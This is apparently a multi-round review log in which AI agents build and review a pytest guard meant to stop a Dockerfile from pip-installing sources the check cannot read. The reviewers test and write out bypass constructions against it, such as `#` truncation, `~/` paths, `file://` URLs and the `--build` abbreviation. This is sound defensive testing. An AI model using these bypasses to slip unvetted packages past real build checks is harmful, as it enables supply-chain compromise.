  `pip install --requirement=req.txt`, `python -m pip install -r req.txt`, `pip3 install -e .`,
  `pip install -c constraints.txt`, `/usr/bin/pip3 install -r req.txt` - confirmed, all fire with a
  message naming the offending token and why.

  `pip install --index-url https://example.org/simple somepkg` still correctly fails via the pre-existing,
  untouched `test_nothing_is_pip_installed_from_a_url_or_a_repo` (`PIP_FROM_NETWORK`), not this test -
  unaffected by this round's changes, as expected.

  **Committed-blob byte check** (after commit `1f576d3`, before push): `git show HEAD:services/etl/tests/
  test_dockerfile.py | python -c "import sys; d=sys.stdin.buffer.read(); print(len(d), d.count(b'\x08'))"`
  -> `20005 0` - 20005 bytes, zero `\x08` occurrences, on the blob actually in the commit. `cat -A` on the
  committed blob's `_dequote`/`pip_indirect_targets` code shows plain `$`-terminated lines throughout, no
  control-character artifacts, matching the working-tree check. `git show HEAD:... | grep -n
  "letters\[-1\]"` finds nothing - the round-2 last-letter bundling bug is gone from the committed blob,
  not just shadowed by new code above it.

  **File length**: `services/etl/tests/test_dockerfile.py` is now 337 lines. CLAUDE.md's 300-line cap
  (pin P-SRC-02, `bash ops/lib/check-line-cap`) only scans `Sources`/`Tests` `*.swift` files under the iOS
  package - confirmed by reading the pin's assertion and `ops/lib/check-line-cap` directly - so this Python
  test file is not in scope for that cap, and `bash ops/check-pins` stays green with this file at its
  current length. Noted rather than silently exceeded.

  **Full verification, unchanged from prior rounds:**

      cd services/etl && python -m pytest -q tests/        -> 46 passed
      bash ops/test                                          -> TESTS linux=96/76 ios=skipped failed=0 skipped=0 / OK
      bash ops/check-pins                                    -> PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux
      bash ops/queue-check                                   -> QUEUE OK (46 tasks)

  Only `services/etl/tests/test_dockerfile.py` is touched; `git diff --stat services/etl/Dockerfile` is
  empty. `git status --porcelain` shows a single ` M`. Handing back to agent/reviewer-29.

- 2026-09-07 agent/reviewer-29: **FAIL, third round.** Fresh pass on a structural rewrite (whitelist, not a
  patch). Item 1's three prior bypasses are genuinely dead. Item 2's false-positive hunt surfaced two real
  gaps in the "must stay green" direction. Item 3's flag-list audit against real pip (both pip 23.0.1 and
  pip 26.1.1, both present on this box - `where python python3 py`) found the headline finding: one entry
  in the safe whitelist is not a real flag on current pip at all, and resolves via pip's own long-option
  abbreviation matching to a genuinely dangerous flag - a live, silent bypass of the exact shape this task
  exists to close, hiding in the whitelist itself, not a hole around it.

  **Re-derived rather than trusted (all confirmed independently, real Dockerfile + pytest harness, not the
  regex/whitelist read in isolation):**
  - Committed blob (`git show HEAD:services/etl/tests/test_dockerfile.py`, HEAD=`2e518f3`): 20005 bytes, 0
    occurrences of `\x08`, matching the owner's number exactly. `cat -A` on `_dequote`/`pip_indirect_targets`
    (test_dockerfile.py:84-181 in the working tree) shows plain `$`-terminated lines, no control-byte
    artifacts. `grep -n "letters\[-1\]"` and `grep -n "PIP_INDIRECT_TARGET\b"` both return nothing against
    the committed blob - the round-2 bug and the old regex name are genuinely gone, not shadowed. File is
    337 lines, matching the claim.
  - Item 1, all five prior bypasses closed, each demonstrated red-then-restored through the real Dockerfile
    + `python -m pytest -q tests/test_dockerfile.py`, Dockerfile restored and `git diff --stat` /
    `git status --porcelain` confirmed empty after every single probe in this review, not just at the end:
    - `COPY requirements.txt .` + `RUN pip install --break-system-packages -r requirements.txt` (round 1,
      reviewer-22's original construction) -> 9 passed, 1 failed, offender `('-r', 'an unreadable target
      flag')`.
    - `RUN pip install -qr requirements.txt` (round 1 bundling bypass) -> 9 passed, 1 failed.
    - `RUN pip install ./localpkg` (round 1 bare-path bypass) -> 9 passed, 1 failed.
    - `RUN pip install -tf -r requirements.txt` (round 2 first-vs-last-letter bundling bypass) -> 9 passed,
      1 failed, offenders `[('-tf', 'a bundled short flag...'), ('-r', 'an unreadable target flag')]`.
    - `RUN pip install "./localpkg"` and `RUN pip install './localpkg'` (round 2 quoting bypasses) -> 9
      passed, 1 failed each, offending token correctly shown with its quotes
      (`"./localpkg"` / `'./localpkg'`). Note: my first pass at the single-quoted case used a malformed
      shell invocation on my end (`$"..."` instead of `$'...'`, which does not expand `\n`) and produced a
      false "10 passed" reading; re-run with the append done via two explicit `printf` args, confirmed the
      correct 9/1 result and that the Dockerfile content actually written was byte-correct
      (`cat -A` showed `RUN pip install './localpkg'$` as a real, single, separate line). Recording this so
      the false lead does not get treated as a live finding - it was a harness mistake on my side, not the
      check's.
  - Item 2's explicit "must stay green" probe list, plus the acknowledged `-qt` regression, all re-run
    through the real Dockerfile + pytest harness: `--no-cache-dir`, `--upgrade --user`, `-U`,
    `'requests>=2,<3'`, `requests[security]`, `--no-deps --no-binary :all:`, `--root-user-action=ignore`,
    `--disable-pip-version-check`, `--target /opt/vendor requests==2.31.0`, `--target=/opt/vendor
    requests==2.31.0`, `--prefix /usr/local requests` - all 10/10 green, confirmed. `pip install -qt /opt`
    -> 9/1, confirmed the owner's acknowledged behavior change actually ships as described.
  - Item 5, P-SRC-02 scope: read `ops/lib/check-line-cap` directly (not the owner's characterization of it).
    Current version: `mapfile -t files < <(git ls-files 'Sources/**/*.swift' 'Tests/**/*.swift')` - a `.py`
    file under `services/etl/tests/` is out of scope, confirmed. Also checked the owner's claim about
    T-0037: that task is not yet merged into `main` as seen from this branch (`queue/claimed/T-0037-...` is
    still present here), but its content is inspectable at `939a30a` (`T-0037: the 300-line cap did not
    reach the Apple package`, now on `main` per `git log --all`, PASS-reviewed at `baf2a6a`). Its diff
    widens the glob to `git ls-files '*.swift'` - every tracked file at any depth, but still filtered
    strictly to the `.swift` extension. `test_dockerfile.py` is a `.py` file, so the owner's claim holds
    under both the current check and T-0037's widened one - re-derived from the actual diff, not taken on
    the owner's word.
  - Full verification suite reproduced with the shipped Dockerfile untouched: `cd services/etl && python -m
    pytest -q tests/` -> 46 passed (dots, exit 0; this shell's `-q` swallows the summary line, same
    pre-existing quirk noted in round 2's review); `cd services/api && npm ci --no-audit --no-fund` -> added
    85 packages; `bash ops/test` -> `TESTS linux=96/76 ios=skipped failed=0 skipped=0` / `OK`; `bash
    ops/check-pins` -> `PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux`; `bash ops/queue-check`
    -> `QUEUE OK (46 tasks)`. All match the owner's numbers exactly. `git status --porcelain` / `git diff
    --stat` empty throughout and at the end.

  **New finding - MAJOR (false positive) - `--quiet`/`--verbose` (long forms of already-whitelisted `-q`/
  `-v`) are missing from `PIP_BOOLEAN_FLAGS_LONG` (`services/etl/tests/test_dockerfile.py:54-61`), while the
  short letters they spell out ARE whitelisted at `:68` (`PIP_BOOLEAN_LETTERS = set("qvUIh")  # -q quiet /
  -v verbose / ...`):**

  `RUN pip install --quiet requests` and `RUN pip install --verbose requests` both fail closed (`1 failed`,
  "a long flag this check does not recognize"), confirmed through the real Dockerfile + pytest harness. This
  is not a case the design's own stated philosophy accepts as a deliberate cost (unlike `-qt` bundling or
  `$REQS`, which the log reasons about explicitly) - the short-letter list already treats `q`/`v` as safe,
  unambiguous, boolean; the long-form spellings of the exact same flags were simply never mirrored into the
  long list. `--isolated` (a genuine, common pip global boolean flag with no short form at all - confirmed
  in `pip install --help` on both pip 23.0.1 and pip 26.1.1 on this box) is also missing and also fails
  closed. All three are exactly the shape the coordinator's brief warned about: "a check that refuses a
  legitimate Dockerfile gets deleted by the next person" - `pip install --quiet --no-cache-dir requests` is
  ordinary, common Dockerfile style, not an edge case.

  **New finding - MAJOR (false positive) - a standard PEP 508 environment-marker install breaks, via the
  pre-existing quote-blind top-level splitter interacting with the new hard-fail-on-unresolvable-quoting
  rule (`pip_install_arglists` at `test_dockerfile.py:71-81`, specifically the `;`-split at line 78; the
  fail-closed consumer is `_dequote`/`pip_indirect_targets` at :84-181):**

  `RUN pip install "requests; python_version>='3.8'"` - real, standard PEP 508 marker syntax pip documents
  and real projects use for platform-conditional installs - fails closed. Root cause, confirmed through the
  harness: `pip_install_arglists` splits the RUN line on a bare `re.split(r"&&|\||;", run_line)` *before*
  any quote-awareness exists, so the `;` inside the quoted marker string tears the line in two, producing a
  malformed leading token (`"requests`, an opening quote with no matching close). `_dequote` correctly (by
  its own logic) reports that token unresolvable, and the new whitelist correctly (by its own logic) fails
  closed on it - the bug is upstream of the round-3 rewrite, in the tokenizer's blindness to quoting when
  splitting on command separators, but round 3's stricter "unresolvable quoting is itself the failure" rule
  is what turns that old blind spot into a red test for a legitimate line, where the round-2 blacklist would
  not necessarily have fired on it.

  **New finding - BLOCKER - `PIP_DESTINATION_VALUE_FLAGS_LONG` whitelists `"--build"` (:45) as a safe,
  skip-its-value destination flag; on pip actually installed on this box (26.1.1, via `py`/`python3` -
  confirmed with `where python python3 py` and `py -0p`), `--build` is not a real flag at all and resolves
  through pip's own long-option prefix-abbreviation matching to `--build-constraint <file>`, a genuine
  unreadable/indirect install-source flag pip added after the old `--build <dir>` flag (which this entry was
  clearly modeled on) was removed. This is a live, silent bypass, not a theoretical one:**

  Proof, most direct evidence first:
  - `python3 -m pip install --build /tmp/nonexistent_probe_xyz.txt --dry-run requests` and
    `python3 -m pip install --build-constraint /tmp/nonexistent_probe_xyz.txt --dry-run requests` produce
    **byte-identical** error text: `ERROR: Could not open requirements file: [Errno 2] No such file or
    directory: '.../nonexistent_probe_xyz.txt'`. `--build` is not merely "similar to" `--build-constraint`,
    it *is* `--build-constraint` on this pip, resolved via unambiguous-prefix matching (confirmed the
    mechanism generally: `--targ` silently resolves to `--target`, and `--requ` is rejected with `ambiguous
    option: --require-hashes, --require-venv, --require-virtualenv, --requirement,
    --requirements-from-script?` - proving pip really does this kind of resolution, and only refuses when
    more than one flag shares the prefix).
  - Confirmed via the real, full Dockerfile + pytest harness, not just direct pip invocation:
    `COPY constraints.txt .` / `RUN pip install --build constraints.txt requests` -> **10 passed, 0
    failed** (should be 9/1 - identical threat model to reviewer-22's original T-0038 finding this whole
    task exists to fix: an install source this parser cannot see into, hiding behind a flag name). Dockerfile
    restored immediately after; `git diff --stat` / `git status --porcelain` confirmed empty.
  - Cross-checked pip 23.0.1 (`python -m pip`, also present on this box) for version sensitivity, in the
    interest of full disclosure rather than only reporting the version that helps my case: on 23.0.1,
    `--build-constraint` does not exist yet and `--build` is flatly rejected (`no such option: --build`), so
    the bypass does not reproduce there - a Dockerfile using this flag would simply fail to build on that
    pip, not silently succeed. The bypass is real and reproducible on pip 26.1.1, which is not a contrived
    or ancient version - it is the current pip on this machine right now, and pip's own abbreviation
    matching means any future pip release that adds a new flag starting with `build` (or `target`, `root`,
    `prefix`, etc. - I did not exhaustively check every entry against every hypothetical future pip, only
    against the two real ones installed here) can silently re-open the same class of hole for any list entry
    that is not itself an exact, currently-real flag name.
  - Systematically re-checked every entry in both long lists against `pip install --help` on pip 26.1.1 for
    exact (non-abbreviation) existence, specifically hunting for more of this same class:
    `PIP_DESTINATION_VALUE_FLAGS_LONG` (:44-50): `--build` (:45) is the only entry that is not a real,
    exact flag name on pip 26.1.1 and that resolves via abbreviation to something dangerous.
    `PIP_BOOLEAN_FLAGS_LONG` (:54-61): `--use-pep517` and `--no-python-version-warning` are both absent from
    `pip install --help` on 26.1.1 but confirmed still silently accepted *without consuming the next token*
    (`pip install --use-pep517 --dry-run requests` and `pip install --no-python-version-warning --dry-run
    requests` both correctly proceed to install `requests`, proving these remain harmless boolean no-ops on
    this pip, not abbreviations of anything else) - not dangerous, noted for completeness.
  - Also checked the short-letter side (item 3's other list): `PIP_DESTINATION_VALUE_LETTERS = set("tifb")`
    (:67) carries the comment `-b build`, the same stale assumption as the long-form bug. Unlike `--build`,
    bare `-b` is flatly rejected by both pip 23.0.1 and pip 26.1.1 (`no such option: -b` on both - pip does
    not do prefix-abbreviation for single-dash short options, confirmed by the mechanism test above), and
    `PIP_DESTINATION_VALUE_FLAGS_LONG`'s separate stale entry `--global-option` (:48) is likewise flatly
    rejected on pip 26.1.1 (`no such option: --global-option`, fully removed, not redirected to anything).
    Both are dead/wrong entries written from the same "plausibility, not real pip" habit as `--build`, but
    are not independently exploitable since real pip refuses them outright rather than silently redirecting
    - noted rather than counted twice toward the verdict; `--build` is the one that matters.

  **Verdict: FAIL.** The `--build` finding alone is blocking: it is a real, silent, reproducible bypass of
  exactly the threat this task exists to close, on the pip actually present in this repo's own dev
  environment, hiding inside the whitelist's own "confidently understood" list rather than in a gap around
  it - the precise failure mode item 3 named ("a boolean flag wrongly listed as value-taking would swallow
  the next token and let an indirect target through" - here a phantom-but-abbreviation-live flag plays the
  same role). The `--quiet`/`--verbose`/`--isolated` and PEP-508-marker false positives compound it: this
  whitelist is simultaneously too loose (an unverified flag name resolves to a dangerous one on real pip)
  and too tight (ordinary syntax with no security relevance fails) in ways neither documented as a deliberate
  trade-off nor caught by the "confirmed against a real pip" claims already in this file's log - those
  claims were true for the specific letters/tokens tested each round, not extended to a full audit of either
  curated list. Send back to agent/builder-9: (1) remove `--build` from `PIP_DESTINATION_VALUE_FLAGS_LONG`
  (and reconsider `-b`/`--global-option` too, even though currently inert, so the list stops encoding
  flags nobody re-verified against real pip); (2) decide, and document the decision either way, on whether
  every whitelist entry must be checked for pip's own abbreviation-matching behavior, not just literal
  presence in `--help` - a flag absent from `--help` but silently redirected by pip itself is a different
  risk class than one flatly rejected, and this file's whitelist model does not currently distinguish them;
  (3) add `--quiet`/`--verbose`/`--isolated` (or otherwise document why they are deliberately excluded, the
  same way the `$REQS` decision is documented) so the long list stops being a strict subset-with-gaps of the
  short list's own coverage decisions; (4) either make `pip_install_arglists`'s command-separator split
  quote-aware or document unquoted-separator-only coverage explicitly, since the new hard-fail-on-quoting
  rule turns that old blind spot into a false positive on standard PEP 508 marker syntax. Left in
  `queue/review/`.

- 2026-09-07 agent/builder-9: **round 4 - chose "keep the whitelist, make it verifiable," argued below,**
  fixed the blocker, both MAJOR false positives, and re-validated every entry in all three flag lists
  against a real, installed pip rather than continuing to rely on memory.

  **Why "keep the whitelist" rather than "narrow the claim":** the coordinator's own analysis of the
  `--build` bug already contains the answer. pip's long-option prefix-abbreviation feature is only a
  danger to *strings this file treats as recognized*; it can never smuggle anything past the "unrecognized
  flag" fallback, because that fallback is reached by anything NOT an exact, literal match against one of
  the three lists - which includes every abbreviation of every flag, safe or dangerous, that isn't spelled
  out in full. The `--build` hole existed only because `--build` was never a real, complete pip flag name
  at all - it was invented from memory in round 3 - and pip's abbreviation resolver turned that invented,
  unvalidated string into a working alias for a real, dangerous one. A whitelist built entirely from exact,
  complete flag spellings copied off a real `pip install --help` cannot be abbreviation-attacked *by
  construction*: this check never performs prefix matching itself, so there is no abbreviation logic to
  get wrong, model, or keep in sync with future pip versions - only a validation discipline (do not add a
  string that has not been confirmed present, in full, in `--help` output) to keep. That discipline, not a
  bigger parser, is what round 3 skipped. Narrowing the claim (refusing every flag except a minimal
  hardcoded set, or refusing all flags entirely) was rejected because the round's own required
  demonstration - `--quiet`/`--verbose`/`--isolated` and a PEP 508 marker must stay green - already commits
  to recognizing ordinary flags case by case; the honest fix for an unverified whitelist is a verified one,
  not a smaller one that still has to draw the same line somewhere.

  **How every entry was validated:** ran `python3 -m pip install --help` against pip 26.1.1 (the same
  version reviewer-29 tested against - both `python3 -m pip --version` and the reported error text match)
  and read the full output line by line, not from memory. Cross-checked every existing entry in
  `PIP_UNREADABLE_TARGET_FLAGS_LONG`, `PIP_DESTINATION_VALUE_FLAGS_LONG`, `PIP_BOOLEAN_FLAGS_LONG`, and both
  letter sets against that output. Findings:
  - **Confirmed NOT real pip 26.1.1 flags, removed:** `--build` (the blocker - see above), `--use-pep517`,
    `--no-python-version-warning` (both apparently removed in modern pip; neither appears anywhere in the
    captured `--help` text). `-b` removed from the short-letter set for the same reason - pip 26.1.1 has no
    single-letter option list entry for it at all.
  - **Confirmed real and newly added, all genuinely reading external, unparseable content -
    `PIP_UNREADABLE_TARGET_FLAGS_LONG` grew from 3 entries to 6:** `--build-constraint <file>` (what
    `--build` actually resolves to - "Constrain build dependencies using the given constraints file"),
    `--requirements-from-script <file>` ("Install dependencies of the given script file as defined by PEP
    723 inline metadata"), `--group <[path:]group>` ("Install a named dependency-group from a
    `pyproject.toml` file"). None of these three were in this file's model before this round; all three are
    exactly the same danger class as `-r`/`-c`/`-e` - an external file this parser cannot read, naming what
    actually gets installed.
  - **Confirmed real, boolean, added:** `--quiet`, `--verbose` (both previously whitelisted only in short
    form, `-q`/`-v` - an asymmetry with no reasoning behind it, not a decision), `--isolated` (missing in
    both forms despite being real, common, and unambiguous), plus `--debug`, `--require-virtualenv`,
    `--version` (`-V`) picked up while reading the full `--help` text, none previously modeled either way.
  - **Confirmed real, value-taking, value confirmed non-source, added to the destination list:**
    `--all-releases`, `--only-final` (package-name/`:all:`/`:none:` selectors), `--uploaded-prior-to` (a
    datetime/duration string), `--keyring-provider`, `--use-feature`, `--use-deprecated` (enum/feature-name
    strings), `--resume-retries` (a number). None of these were previously modeled; none are required by
    any probe, added because the validation pass was already reading their full descriptions and none of
    them names or reads an install source.
  - **Confirmed real, unchanged:** every other prior entry (`--target`, `--root`, `--prefix`, `--src`,
    `--cache-dir`, `--log`, `--python`, `--platform`, `--python-version`, `--implementation`, `--abi`,
    `--proxy`, `--retries`, `--timeout`, `--progress-bar`, `--report`, `--index-url`, `--extra-index-url`,
    `--find-links`, `--trusted-host`, `--cert`, `--client-cert`, `--upgrade-strategy`, `--config-settings`,
    `--no-binary`, `--only-binary`, `--exists-action`, `--root-user-action`, and the boolean list minus the
    two removed above) - each line-matched against the captured `--help` text, not re-typed from memory.
  - **Short letters, fully re-derived from `--help`'s own short-option annotations** (`-r, --requirement`,
    `-c, --constraint`, `-e, --editable`, `-t, --target`, `-U, --upgrade`, `-I, --ignore-installed`,
    `-C, --config-settings`, `-i, --index-url`, `-f, --find-links`, `-h, --help`, `-v, --verbose`,
    `-V, --version`, `-q, --quiet` - thirteen total, nothing else): `PIP_UNREADABLE_TARGET_LETTERS`
    unchanged (`rce`); `PIP_DESTINATION_VALUE_LETTERS` lost `b` (not real) and gained `C`
    (`--config-settings`, real, previously missing); `PIP_BOOLEAN_LETTERS` gained `V` (`--version`, real,
    previously missing).

  Every list is matched by **exact string equality only** - `pip_indirect_targets` never does prefix or
  substring matching against these lists, so an abbreviated or unverified spelling of any flag, in either
  direction, always falls through to "unrecognized" and fails closed. This is what makes the whitelist
  abbreviation-proof going forward without modeling abbreviation at all.

  **The two MAJOR false positives, fixed separately from the whitelist validation:**
  - `--quiet`/`--verbose`/`--isolated`: closed by the whitelist additions above.
  - The PEP 508 marker: `pip_install_arglists`'s command-separator split (`re.split(r"&&|\||;", run_line)`)
    tore `"requests; python_version>='3.8'"` apart on the `;` living inside its own quotes, before this
    file had any notion of quoting - the exact old blind spot the round-3 "unresolvable quoting fails
    closed" rule turned into a false positive. Fixed by replacing that regex split with `_split_unquoted`,
    a small quote-tracking scanner (single pass, tracks `'`/`"` state, no backslash-escape handling), so a
    `;` inside a quoted region is never treated as a command boundary. Separately, tokenization of each
    invocation's argument text switched from a bare `.split()` plus this file's own hand-rolled `_dequote`
    (round 3) to the Python standard library's `shlex` (`_shlex_tokens`, `posix=True,
    punctuation_chars=True, whitespace_split=True`) - a real, tested POSIX-shell tokenizer, not a second
    hand-rolled quote parser to get subtly wrong in a fifth round. `shlex` strips quote delimiters as part
    of tokenization, so `_dequote` is gone entirely; a token that cannot be tokenized at all (verified via
    `shlex.shlex.__next__`'s `ValueError`) is now reported as the whole invocation being "unparsable" -
    still fail-closed, just at the invocation level instead of the per-token level, since shlex either
    resolves an argument list correctly or does not resolve it at all.

  One consequence worth naming: `pip install` hidden inside `sh -c "pip install -r req.txt"` is still
  caught (required, confirmed below), but now via the "unparsable" path rather than by naming `-r`
  specifically - the substring extracted after "install" ends mid-quote (the closing quote belongs to the
  *outer* `sh -c "..."` wrapper, which this extraction does not see), so `shlex` correctly refuses to
  guess and raises, and that refusal is itself the failure. Same overall result, more honest reason.

  **RED before fix, the blocker, real Dockerfile + pytest harness** (test file pinned to `ed360c3`, the
  commit reviewer-29's round-4 review left the task in, swapped into `tests/test_dockerfile.py`, run
  against the Dockerfile with `COPY constraints.txt .` + the bypass line appended):

      RUN pip install --build constraints.txt requests   -> 10 passed

  Reproduces reviewer-29's round-4 finding live, independently.

  **GREEN after fix, same construction, same harness** (live, round-4 test file restored):

      RUN pip install --build constraints.txt requests
      -> 1 failed: [('--build', 'a long flag this check does not recognize')]

  Also directly demonstrated the real flag `--build` resolves to:

      RUN pip install --build-constraint constraints.txt requests
      -> 1 failed: [('--build-constraint', 'an unreadable target flag')]

  And confirmed the byte-identical pip error text reviewer-29 reported, independently, against the same
  pip (26.1.1) used for this task:

      pip install --dry-run --build <missing-file> requests             -> "Could not open requirements
      pip install --dry-run --build-constraint <missing-file> requests  ->  file: ... <missing-file>"

  identical error text both ways, confirming `--build` truly does resolve to `--build-constraint` on this
  pip, not merely on reviewer-29's.

  Dockerfile restored after each run; `git diff --stat Dockerfile` / `git status --porcelain Dockerfile`
  empty at every checkpoint.

  **Required greens, real Dockerfile + pytest harness (`10 passed` each):** `pip install --quiet requests`,
  `pip install --verbose requests`, `pip install --isolated requests`,
  `pip install "requests; python_version>='3.8'"` - confirmed, none fire.

  **All five-plus earlier bypasses, real harness, still `1 failed` on the new test:**
  `pip install -qr requirements.txt` (round 1), `pip install ./localpkg` (round 1),
  `pip install -tf -r requirements.txt` (round 2), `pip install "./localpkg"` (round 2),
  `pip install './localpkg'` (round 2), `pip install $REQS` (round 3 reversal),
  `pip install -r $REQS`, `pip install --requirement=req.txt`, `python -m pip install -r req.txt`,
  `pip3 install -e .`, `pip install -c constraints.txt`, `/usr/bin/pip3 install -r req.txt`,
  `sh -c "pip install -r req.txt"` (now via the "unparsable" path, per above) - confirmed, all still fire.

  **Full false-positive list re-confirmed, real harness (`10 passed` each):** `pip install requests`,
  `pip install 'requests==2.31.0'`, `pip download -r x.txt`, `apt-get install -y python3-yaml`,
  `grep -r foo /etc`, `rm -r /tmp/foo`, `cp -r /a /b`, `pip install --target /opt/vendor
  requests==2.31.0`, `pip install --prefix /usr/local requests`, `pip install -t /opt/vendor requests`,
  `pip install --no-color requests`, `pip install --upgrade requests`, the shipped `apt-get` RUN line -
  none fire. `pip install --index-url https://example.org/simple somepkg` still correctly fails via the
  pre-existing, untouched `test_nothing_is_pip_installed_from_a_url_or_a_repo`, not this test.

  **Committed-blob byte check** (after commit `9afc803`, before push): `git show HEAD:services/etl/tests/
  test_dockerfile.py | python -c "import sys; d=sys.stdin.buffer.read(); print(len(d), d.count(b'\x08'))"`
  -> `26580 0` - 26580 bytes, zero `\x08` occurrences, on the blob actually in the commit, matching the
  working-tree number exactly. `cat -A` on `_split_unquoted`/`_shlex_tokens`/`pip_indirect_targets` in the
  committed blob shows plain `$`-terminated lines throughout. `git show HEAD:... | grep -n '"--build"'`
  finds nothing (the bare, invented `--build` entry is gone from the commit, not just the working tree);
  `git show HEAD:... | grep -n "build-constraint\|requirements-from-script"` finds both new
  unreadable-target flags present.

  **Full verification, unchanged from prior rounds:**

      cd services/etl && python -m pytest -q tests/        -> 46 passed
      bash ops/test                                          -> TESTS linux=96/76 ios=skipped failed=0 skipped=0 / OK
      bash ops/check-pins                                    -> PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux
      bash ops/queue-check                                   -> QUEUE OK (46 tasks)

  Only `services/etl/tests/test_dockerfile.py` is touched; `git diff --stat services/etl/Dockerfile` is
  empty. `git status --porcelain` shows a single ` M`. Handing back to agent/reviewer-29.

### 2026-09-08 agent/reviewer-pr29 (round 5): FAIL

Reviewed on `task/T-0046` @ `965aea5`, in a throwaway worktree (`.worktrees/rev-T-0046`); the T-0046 worktree
was not modified apart from this task file. Every number below was produced by running the command, not read
from the log above.

**The headline claim holds.** reviewer-22's exact construction now fails, and the round-2/round-4 findings
stay fixed. Credit where it is due - this is a real fix, and I confirmed it before looking for holes:

    control: COPY requirements.txt . + RUN pip install --break-system-packages -r requirements.txt
      -> RED (rc=1) | 1 failed, 9 passed in 0.08s

    `pip install --build constraints.txt requests`   -> [('--build', 'a long flag this check does not recognize')]
    `pip install -qr requirements.txt`               -> [('-qr', 'a bundled short flag ...')]
    `pip install './localpkg'`                       -> [('./localpkg', 'a local path')]
    `pip install --requirement=requirements.txt`     -> [('--requirement=requirements.txt', 'an unreadable target flag')]
    `pip install $REQS`                              -> [('$REQS', 'a shell/build-arg substitution ...')]
    `sh -c "pip install -r requirements.txt"`        -> [('(unparsable)', 'could not tokenize')]
    `pip install "requests; python_version>='3.8'"`  -> not blocked (the round-4 false positive is fixed)

Two constructs I suspected and cleared by testing real pip rather than asserting from memory, so they are
NOT findings: `pip install --log -r requirements.txt` (real pip's `--log` consumes the `-r` token - a log
file literally named `-r` was created and pip tried to install a package named `requirements.txt`, so the
parser's model matches pip), and `pip install vendorpkg` (a bare directory name with no `./` - real pip
rejects it: `Could not find a version that satisfies the requirement vendorpkg`).

#### BLOCKER 1 - three fail-OPEN bypasses of the exact class this task exists to close

Each was appended to the real Dockerfile and the FULL suite was run. RED = guard works, GREEN = hole. The
control above is the same harness, so these are directly comparable:

    GREEN (rc=0) | RUN pip install --break-system-packages pkg#egg=z -r requirements.txt   | 10 passed
    GREEN (rc=0) | RUN pip install --break-system-packages pkg#egg=z ./localpkg            | 10 passed
    GREEN (rc=0) | RUN pip install --break-system-packages ~/localpkg                      | 10 passed
    GREEN (rc=0) | RUN pip install --break-system-packages file:///w/wheels/evil.whl       | 10 passed

**(a) An unquoted `#` silently truncates the argument list, and the guard vouches for the remainder.**
`_shlex_tokens` builds `shlex.shlex(text, posix=True, punctuation_chars=True)` and never clears
`commenters`, which defaults to `'#'`:

    shlex.shlex default commenters = '#'
    'RUN pip install pkg#x -r requirements.txt'  -> [(['pkg'], True)]
    'RUN pip install pkg#egg=z ./localpkg'       -> [(['pkg'], True)]

The tail is dropped and the result is returned as `ok=True` - parsed fine - not as unparsable. A real shell
does not agree that this is a comment; `#` only opens one at word start:

    sh -c 'python showargs.py install pkg#x -r requirements.txt'
      -> pip would receive argv: ['install', 'pkg#x', '-r', 'requirements.txt']

So pip installs from `requirements.txt` while the guard reports nothing. Note the second line above: the
truncation also hides `./localpkg`, an offender this guard otherwise catches - `pip install ./localpkg` is
RED, `pip install pkg#egg=z ./localpkg` is GREEN. This is the precise inversion of the file's stated
contract: it reads a *partial* argument list and vouches for it. Fix is one line: `lexer.commenters = ""`.

**(b) `~/` defeats the local-path gate.** The check is
`tok in (".", "..") or tok.startswith(("./", "../", "/"))`; `~` is not in the tuple. Docker `RUN` uses
`/bin/sh -c`, which expands it, so pip receives an absolute local directory. Verified against real pip:

    sh -c 'python -m pip install --dry-run --no-index --no-build-isolation ~/tilde_probe_pkg'
      -> Processing c:\users\phineasf\tilde_probe_pkg
         Preparing metadata (pyproject.toml): started

This is the same class as the `./localpkg` hole round 2 found, with a different prefix character.

**(c) `file://` matches neither guard.** `PIP_FROM_NETWORK` matches only `https?://`, `git+`,
`--index-url`, `--extra-index-url`, `--find-links`; `pip_indirect_targets` sees a bare word that is not a
flag, has no `$`, and does not start `./ ../ /` - so it is classified as an ordinary requirement specifier.
Real pip accepts it as an install source:

    python -m pip install --dry-run --no-index --no-build-isolation "file:///.../vendorpkg"
      -> Processing \\c\users\...\pipprobe\vendorpkg

(The subsequent error is Windows UNC path mangling; the load-bearing part is that pip took it as a source.
`hg+https://`/`svn+https://` happen to be caught only incidentally, by the `https://` substring.)
Treating any token containing `://` as unreadable would close (c) and those together.

#### BLOCKER 2 - the guard has zero automated coverage; the one new test is vacuous

This is why (a)-(c) survived four review rounds, and it is the finding I would fix first.

The shipped Dockerfile contains no `pip install` at all - one `RUN`, and it is `apt-get`. So the new test
asserts over an empty set:

    RUN count = 1
    pip install invocation count = 0
    pip_indirect_target_offenders() = []
    pip_indirect_targets call count during the new test = 0

`pip_indirect_targets` - the whitelist engine, and the entire security value of this change - is invoked
**zero times** by the suite. Confirmed by mutation: replacing its body with `return []` so that nothing is
ever an offender leaves the suite byte-identical in outcome.

    baseline                              -> 46 passed in 3.50s, EXIT=0
    with `pip_indirect_targets -> []`     -> 46 passed in 3.55s, EXIT=0

Roughly 215 new lines - three whitelists, three letter sets, `_split_unquoted`, `_shlex_tokens`,
`pip_install_arglists`, `pip_indirect_targets` - are unreachable from any assertion. Per CLAUDE.md, *"A
check that has never been seen red is untested."* The red/green demos in the log above are hand-edits of
the Dockerfile: real work, but transcripts, not regression tests. Nothing committed can tell a working
whitelist from an absent one, so the next edit to these lists gets no signal, exactly as this one did not.

The parser is a pure function over strings and needs no Docker: table-driven cases over
`pip_install_arglists`/`pip_indirect_targets` would have caught all three bypasses above in the same run.

#### NOTE (not blocking) - the whitelist's provenance is not pinned anywhere

The log states every entry was validated against pip 26.1.1. I cannot reproduce that: the only pip reachable
here is 23.0.1, under which `--use-pep517` and `--no-python-version-warning` - both removed in round 4 as
flags that "were never real pip flags to begin with" - are real, and 8 whitelisted entries
(`--build-constraint`, `--group`, `--requirements-from-script`, `--all-releases`, `--only-final`,
`--uploaded-prior-to`, `--resume-retries`, `--keyring-provider`) are absent. I am *not* calling these
invented - pip 26.x plausibly added them, and I have no pip 26.1.1 to check against. That is the point: an
unvalidated whitelist entry is exactly what created the round-4 `--build` hole, the pinned image contains no
pip at all (apt `python3` + `python3-pytest`), and nothing in the tree records which pip this list describes.
The version belongs next to the lists, machine-checkably, or the same failure recurs on the next pip bump.

#### Checked and explicitly NOT held against this PR

- `services/etl/tests/test_dockerfile.py` is 436 lines against the 300-line cap, but that is already filed
  as T-0062 with a planned T-0058 exemption, and the file was over budget before this round.
